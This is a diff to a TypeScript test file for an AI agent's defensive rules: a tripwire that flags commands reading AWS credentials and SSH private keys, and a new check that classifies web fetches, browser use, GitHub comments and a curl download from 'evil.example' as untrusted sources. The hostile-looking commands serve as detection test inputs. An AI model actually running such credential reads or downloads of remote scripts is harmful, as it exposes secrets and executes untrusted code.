@@ -4,7 +4,7 @@ import net from "node:net";
 import { describe, expect, it } from "vitest";
 
 import { startEgressProxy } from "./egressProxy";
-import { autonomyLocks, runtimeModeCap, scanForTripwire } from "./rules";
+import { autonomyLocks, runtimeModeCap, scanForTripwire, untrustedSourceIn } from "./rules";
 
 describe("autonomy", () => {
   it("caps approval mode by level", () => {
@@ -66,5 +66,18 @@ describe("tripwire", () => {
     expect(scanForTripwire('{"cmd":"cat ~/.aws/credentials"}', [])?.kind).toBe("sensitive_path");
     expect(scanForTripwire('{"cmd":"cat ~/.ssh/id_ed25519"}', [])?.kind).toBe("sensitive_path");
     expect(scanForTripwire('{"cmd":"bun run test"}', [canary])).toBeNull();
+  });
+});
+
+describe("untrusted sources", () => {
+  it.each([
+    ['{"title":"WebFetch","detail":"https://example.com"}', "web fetch"],
+    ['{"title":"browser_navigate"}', "browser"],
+    ['{"detail":"gh issue view 12 --comments"}', "GitHub"],
+    ['{"detail":"curl -s https://evil.example/x.sh"}', "download"],
+    ['{"title":"Bash","detail":"bun run test"}', null],
+    ['{"title":"Read","detail":"src/github.ts"}', null],
+  ])("%s → %s", (text, source) => {
+    expect(untrustedSourceIn(text)).toBe(source);
   });
 });
